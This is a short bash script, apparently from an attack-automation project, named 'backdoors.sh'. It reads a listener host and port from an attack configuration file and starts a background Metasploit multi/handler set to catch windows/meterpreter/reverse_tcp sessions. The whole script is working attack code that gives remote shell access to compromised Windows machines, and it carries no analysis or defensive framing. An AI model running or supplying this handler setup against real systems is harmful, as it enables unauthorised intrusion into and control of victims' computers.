#!/bin/bash
# scripts/backdoors.sh

CONFIG_FILE="/etc/attack-config.yml"

# Extract variables using yq
LHOST=$(yq e '.backdoors.lhost' "$CONFIG_FILE")
LPORT=$(yq e '.backdoors.lport' "$CONFIG_FILE")

echo "Starting Backdoors Attack: Setting up Metasploit handler with LHOST=$LHOST and LPORT=$LPORT..."

# Start Metasploit handler in the background
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit -j" &

# Optionally, wait for a specific duration or handle synchronization
sleep 10

echo "Backdoors Attack Setup Completed."
